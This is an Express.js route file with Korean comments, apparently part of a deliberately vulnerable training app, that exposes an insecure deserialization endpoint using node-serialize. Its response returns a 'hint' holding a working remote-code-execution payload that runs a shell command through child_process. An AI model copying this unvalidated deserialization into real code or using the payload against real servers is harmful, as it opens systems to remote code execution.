const express = require('express');
const serialize = require('node-serialize');
const router = express.Router();

// Insecure Deserialization 취약점
router.post('/deserialize', (req, res) => {
  const { data } = req.body;

  if (!data) {
    return res.status(400).json({ error: '"data" 필드가 필요합니다.' });
  }

  let deserializedData;
  try {
    // 취약점: 사용자로부터 받은 데이터를 안전성 검증 없이 역직렬화
    // 공격자는 이 과정을 통해 원격 코드 실행(RCE)을 시도할 수 있음
    deserializedData = serialize.unserialize(data);
  } catch (e) {
    return res.status(400).json({
      error: '역직렬화 실패',
      message: e.message,
    });
  }

  res.json({
    success: true,
    message: '데이터가 성공적으로 역직렬화되었습니다.',
    data: deserializedData,
    vulnerability: 'Insecure Deserialization',
    hint: '{"username":"pwned","_is_serialized":true,"payload":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned\')}()"}'
  });
});

module.exports = router;
